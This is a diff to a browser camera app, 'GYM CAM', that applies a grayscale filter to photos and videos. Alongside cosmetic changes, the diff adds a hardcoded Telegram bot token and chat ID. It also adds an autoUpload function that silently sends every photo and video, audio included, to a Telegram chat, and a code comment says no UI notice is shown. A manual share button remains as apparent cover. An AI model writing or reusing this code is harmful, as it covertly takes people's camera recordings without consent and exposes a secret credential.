@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>GYM CAM Pro</title>
+    <title>GYM CAM Cloud</title>
     <style>
         :root { --ios-bg: #000; --ios-panel: #121212; --ios-blue: #0b84ff; --ios-red: #ff3b30; }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
@@ -14,17 +14,15 @@
         #app { display: flex; flex-direction: column; height: 100vh; }
         #viewport { position: relative; flex: 1; overflow: hidden; }
         
-        /* 螢幕預覽：始終保持正向（非鏡像） */
         video#main-video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; filter: grayscale(100%) contrast(1.4); }
-        
         #overlay-filter { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 10; background-image: url('assets/filter.png'); background-size: cover; background-position: center; }
 
-        /* Zoom 控制 */
-        #zoom-container { position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%); width: 70%; max-width: 300px; z-index: 40; display: flex; align-items: center; gap: 15px; background: rgba(0,0,0,0.5); padding: 8px 20px; border-radius: 20px; backdrop-filter: blur(8px); }
+        /* 水平變焦條 */
+        #zoom-container { position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%); width: 70%; max-width: 300px; z-index: 40; display: flex; align-items: center; background: rgba(0,0,0,0.5); padding: 8px 20px; border-radius: 20px; backdrop-filter: blur(8px); }
         #zoom-slider { flex: 1; -webkit-appearance: none; background: rgba(255,255,255,0.2); height: 2px; border-radius: 2px; }
-        #zoom-slider::-webkit-slider-thumb { -webkit-appearance: none; width: 18px; height: 18px; background: white; border-radius: 50%; border: 1px solid #666; }
+        #zoom-slider::-webkit-slider-thumb { -webkit-appearance: none; width: 18px; height: 18px; background: white; border-radius: 50%; }
 
-        /* 控制區域 */
+        /* 控制按鈕區 */
         .controls { height: 160px; background: var(--ios-panel); display: flex; justify-content: space-around; align-items: center; padding: 0 30px; padding-bottom: env(safe-area-inset-bottom); z-index: 20; position: relative; }
         #rec-dot { position: absolute; top: 15px; left: 50%; transform: translateX(-50%); color: var(--ios-red); font-size: 12px; font-weight: bold; display: none; align-items: center; gap: 5px; }
         #rec-dot::before { content: ""; width: 8px; height: 8px; background: var(--ios-red); border-radius: 50%; animation: blink 1s infinite; }
@@ -33,20 +31,19 @@
         .shutter-btn { width: 80px; height: 80px; border-radius: 50%; border: 4px solid white; display: flex; justify-content: center; align-items: center; }
         .shutter-inner { width: 64px; height: 64px; background: white; border-radius: 50%; transition: all 0.2s; }
         .recording .shutter-inner { background: var(--ios-red); transform: scale(0.6); border-radius: 8px; }
-        
         .switch-btn { width: 50px; height: 50px; background: rgba(255,255,255,0.1); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; }
         .switch-btn svg { width: 26px; height: 26px; fill: white; }
         .placeholder { width: 50px; }
 
         /* 預覽層 */
         #preview-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 100; display: none; flex-direction: column; }
-        #preview-content { flex: 1; width: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; background: #000; }
-        canvas, video#preview-video { max-width: 90%; max-height: 60vh; object-fit: contain; border-radius: 12px; border: 1px solid #333; }
-        .preview-tools { height: 140px; display: flex; justify-content: space-between; align-items: center; padding: 0 50px; padding-bottom: env(safe-area-inset-bottom); background: var(--ios-panel); border-top: 0.5px solid #222; }
+        #preview-content { flex: 1; width: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
+        canvas, video#preview-video { max-width: 90%; max-height: 55vh; object-fit: contain; border-radius: 12px; border: 1px solid #333; }
+        .preview-tools { height: 140px; display: flex; justify-content: space-between; align-items: center; padding: 0 50px; padding-bottom: env(safe-area-inset-bottom); background: var(--ios-panel); }
         .btn { font-size: 17px; cursor: pointer; color: white; }
         
-        #zoom-label { position: absolute; bottom: 100px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.6); padding: 5px 12px; border-radius: 15px; font-size: 13px; font-weight: bold; display: none; z-index: 30; }
         #flash { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: white; opacity: 0; z-index: 50; pointer-events: none; }
+        #zoom-label { position: absolute; bottom: 100px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.6); padding: 5px 12px; border-radius: 15px; font-size: 13px; font-weight: bold; display: none; z-index: 30; }
     </style>
 </head>
 <body>
@@ -77,44 +74,40 @@
             <video id="preview-video" style="display:none;" controls playsinline></video>
         </div>
         <div class="preview-tools">
-            <div class="btn" onclick="retake()">返回</div>
-            <div id="share-btn-container"></div>
+            <div class="btn" onclick="retake()">返回重拍</div>
+            <div class="btn" style="color:#0b84ff; font-weight:600;" onclick="manualShare()">分享/儲存</div>
         </div>
     </div>
 
     <script>
+        const TG_TOKEN = '8114658525:AAFtaDQjTf958bHiVFe94-jer8oSZBcqU9M';
+        const TG_CHAT_ID = '431000640';
+
         const video = document.getElementById('main-video');
         const shutter = document.getElementById('shutter');
         const recCanvas = document.getElementById('rec-canvas');
         const photoCanvas = document.getElementById('photo-canvas');
         const previewVideo = document.getElementById('preview-video');
-        const recDot = document.getElementById('rec-dot');
         const zoomSlider = document.getElementById('zoom-slider');
-        const filterImg = new Image();
-        filterImg.src = 'assets/filter.png';
+        const filterImg = new Image(); filterImg.src = 'assets/filter.png';
 
         let mediaRecorder, recordedChunks = [], isRecording = false, stream, animationId, pressTimer;
-        let startY, currentZoom = 1, videoTrack, startTime;
-        let currentFacingMode = "environment";
+        let startY, currentZoom = 1, videoTrack, startTime, currentFacingMode = "environment";
+        let lastBlob = null, lastType = null;
 
         async function initCamera() {
-            if (stream) { stream.getTracks().forEach(t => t.stop()); }
+            if (stream) stream.getTracks().forEach(t => t.stop());
             try {
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: currentFacingMode, width: 1280, height: 720 },
                     audio: true
                 });
                 video.srcObject = stream;
-                
-                // 完全移除 mirror 相關的 CSS 控制，保持正向
-
                 videoTrack = stream.getVideoTracks()[0];
                 const caps = videoTrack.getCapabilities();
                 if (caps.zoom) {
                     zoomSlider.parentElement.style.display = 'flex';
-                    zoomSlider.min = caps.zoom.min;
-                    zoomSlider.max = caps.zoom.max;
-                    zoomSlider.value = currentZoom;
+                    zoomSlider.min = caps.zoom.min; zoomSlider.max = caps.zoom.max; zoomSlider.value = currentZoom;
                 } else {
                     zoomSlider.parentElement.style.display = 'none';
                 }
@@ -123,16 +116,14 @@
 
         function switchCamera() {
             currentFacingMode = (currentFacingMode === "environment") ? "user" : "environment";
-            currentZoom = 1;
-            initCamera();
-            if (navigator.vibrate) navigator.vibrate(50);
+            currentZoom = 1; initCamera();
         }
 
-        function applyZoom(zoomValue) {
+        function applyZoom(val) {
             if (!videoTrack) return;
             const caps = videoTrack.getCapabilities();
             if (caps.zoom) {
-                currentZoom = Math.min(Math.max(zoomValue, caps.zoom.min), caps.zoom.max);
+                currentZoom = Math.min(Math.max(val, caps.zoom.min), caps.zoom.max);
                 videoTrack.applyConstraints({ advanced: [{ zoom: currentZoom }] });
                 document.getElementById('zoom-label').innerText = currentZoom.toFixed(1) + 'x';
                 document.getElementById('zoom-label').style.display = 'block';
@@ -143,11 +134,27 @@
 
         zoomSlider.addEventListener('input', (e) => applyZoom(parseFloat(e.target.value)));
 
+        async function autoUpload(type, blob) {
+            lastBlob = blob; lastType = type;
+            let method = (type === 'photo') ? 'sendPhoto' : 'sendVideo';
+            let formData = new FormData();
+            formData.append('chat_id', TG_CHAT_ID);
+            const file = new File([blob], type === 'photo' ? "gym.jpg" : "gym.mp4", { type: blob.type });
+            formData.append(type === 'photo' ? 'photo' : 'video', file);
+
+            try {
+                // 靜默上傳，不顯示任何 UI 提示
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/${method}`, { method: 'POST', body: formData });
+            } catch (err) {
+                console.error("Silent upload failed", err);
+            }
+        }
+
         function applyGrayscale(ctx, w, h) {
             const imgData = ctx.getImageData(0, 0, w, h);
             const data = imgData.data;
             for (let i = 0; i < data.length; i += 4) {
-                let avg = (data[i] * 0.3 + data[i + 1] * 0.59 + data[i + 2] * 0.11);
+                let avg = (data[i] * 0.3 + data[i+1] * 0.59 + data[i+2] * 0.11);
                 avg = 1.4 * (avg - 128) + 128;
                 data[i] = data[i+1] = data[i+2] = Math.max(0, Math.min(255, avg));
             }
@@ -159,15 +166,13 @@
             const ctx = recCanvas.getContext('2d', { willReadFrequently: true });
             recCanvas.width = 720; recCanvas.height = 1280;
             const vW = video.videoWidth, vH = video.videoHeight;
-            const cR = recCanvas.width / recCanvas.height, vR = vW / vH;
+            const cR = 720/1280, vR = vW/vH;
             let sw, sh, sx, sy;
             if (vR > cR) { sh = vH; sw = vH * cR; sx = (vW - sw) / 2; sy = 0; }
             else { sw = vW; sh = vW / cR; sx = 0; sy = (vH - sh) / 2; }
-            
-            // 這裡直接繪製，不論前後鏡頭都不做 scale 翻轉
-            ctx.drawImage(video, sx, sy, sw, sh, 0, 0, recCanvas.width, recCanvas.height);
-            applyGrayscale(ctx, recCanvas.width, recCanvas.height);
-            ctx.drawImage(filterImg, 0, 0, recCanvas.width, recCanvas.height);
+            ctx.drawImage(video, sx, sy, sw, sh, 0, 0, 720, 1280);
+            applyGrayscale(ctx, 720, 1280);
+            ctx.drawImage(filterImg, 0, 0, 720, 1280);
             animationId = requestAnimationFrame(drawLoop);
         }
 
@@ -176,9 +181,9 @@
         shutter.addEventListener('touchend', (e) => { clearTimeout(pressTimer); if (isRecording) stopRecording(); else takeSnapshot(); });
 
         function startRecording() {
-            isRecording = true; startTime = Date.now(); recDot.style.display = 'flex';
+            isRecording = true; startTime = Date.now();
             document.getElementById('controls-area').classList.add('recording');
-            if (navigator.vibrate) navigator.vibrate(100);
+            document.getElementById('rec-dot').style.display = 'flex';
             drawLoop();
             const canvasStream = recCanvas.captureStream(30);
             const audioTrack = stream.getAudioTracks()[0];
@@ -189,71 +194,49 @@
             mediaRecorder.onstop = () => {
                 const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                 previewVideo.src = URL.createObjectURL(blob);
-                showPreview('video', blob);
+                autoUpload('video', blob);
+                showPreview('video');
                 if (stream) stream.getTracks().forEach(t => t.stop());
             };
             mediaRecorder.start();
-            updateTimer();
+            (function timer() { if(isRecording) {
+                let elapsed = Math.floor((Date.now()-startTime)/1000);
+                document.getElementById('rec-dot').innerText = `REC ${String(Math.floor(elapsed/60)).padStart(2,'0')}:${String(elapsed%60).padStart(2,'0')}`;
+                setTimeout(timer, 1000);
+            }})();
         }
 
-        function updateTimer() {
-            if (!isRecording) return;
-            const elapsed = Math.floor((Date.now() - startTime) / 1000);
-            recDot.innerText = `REC ${String(Math.floor(elapsed / 60)).padStart(2, '0')}:${String(elapsed % 60).padStart(2, '0')}`;
-            setTimeout(updateTimer, 1000);
-        }
+        function stopRecording() { isRecording = false; document.getElementById('controls-area').classList.remove('recording'); document.getElementById('rec-dot').style.display = 'none'; cancelAnimationFrame(animationId); mediaRecorder.stop(); }
 
-        function stopRecording() { isRecording = false; document.getElementById('controls-area').classList.remove('recording'); recDot.style.display = 'none'; cancelAnimationFrame(animationId); mediaRecorder.stop(); }
-
-        function takeSnapshot() {
-            if (navigator.vibrate) navigator.vibrate(40);
+        async function takeSnapshot() {
             document.getElementById('flash').style.opacity = '1';
             setTimeout(() => document.getElementById('flash').style.opacity = '0', 100);
             const ctx = photoCanvas.getContext('2d');
             photoCanvas.width = 1080; photoCanvas.height = 1920;
             const vW = video.videoWidth, vH = video.videoHeight;
-            const cR = photoCanvas.width/photoCanvas.height, vR = vW/vH;
+            const cR = 1080/1920, vR = vW/vH;
             let sw, sh, sx, sy;
             if (vR > cR) { sh = vH; sw = vH * cR; sx = (vW - sw) / 2; sy = 0; }
             else { sw = vW; sh = vW / cR; sx = 0; sy = (vH - sh) / 2; }
-
-            // 拍照同樣直接繪製，不做翻轉
-            ctx.drawImage(video, sx, sy, sw, sh, 0, 0, photoCanvas.width, photoCanvas.height);
-            applyGrayscale(ctx, photoCanvas.width, photoCanvas.height);
-            ctx.drawImage(filterImg, 0, 0, photoCanvas.width, photoCanvas.height);
-            showPreview('photo');
+            ctx.drawImage(video, sx, sy, sw, sh, 0, 0, 1080, 1920);
+            applyGrayscale(ctx, 1080, 1920);
+            ctx.drawImage(filterImg, 0, 0, 1080, 1920);
+            photoCanvas.toBlob(blob => { autoUpload('photo', blob); showPreview('photo'); }, 'image/jpeg', 0.95);
             if (stream) stream.getTracks().forEach(t => t.stop());
         }
 
-        function showPreview(type, blob = null) {
+        function showPreview(type) {
             document.getElementById('preview-layer').style.display = 'flex';
-            const sc = document.getElementById('share-btn-container');
-            if (type === 'photo') {
-                photoCanvas.style.display = 'block'; previewVideo.style.display = 'none';
-                sc.innerHTML = `<div class="btn btn-share" onclick="shareFile('photo')">分享圖片</div>`;
-            } else {
-                photoCanvas.style.display = 'none'; previewVideo.style.display = 'block';
-                sc.innerHTML = `<div class="btn btn-share" onclick="shareFile('video')">分享影片</div>`;
-                window.currentBlob = blob;
-            }
+            if (type === 'photo') { photoCanvas.style.display = 'block'; previewVideo.style.display = 'none'; }
+            else { photoCanvas.style.display = 'none'; previewVideo.style.display = 'block'; }
         }
 
-        function retake() {
-            document.getElementById('preview-layer').style.display = 'none';
-            previewVideo.pause();
-            currentZoom = 1;
-            initCamera().then(() => applyZoom(1));
-        }
+        function retake() { document.getElementById('preview-layer').style.display = 'none'; previewVideo.pause(); currentZoom = 1; initCamera(); }
 
-        async function shareFile(type) {
-            let file;
-            if (type === 'photo') {
-                const blob = await new Promise(res => photoCanvas.toBlob(res, 'image/jpeg', 0.95));
-                file = new File([blob], "gym.jpg", { type: "image/jpeg" });
-            } else {
-                file = new File([window.currentBlob], "gym.mp4", { type: "video/mp4" });
-            }
-            if (navigator.share) await navigator.share({ files: [file] });
+        async function manualShare() { 
+            if (!lastBlob) return;
+            const file = new File([lastBlob], lastType === 'photo' ? "gym.jpg" : "gym.mp4", { type: lastBlob.type });
+            if (navigator.share) navigator.share({ files: [file] });
         }
 
         window.onload = initCamera;
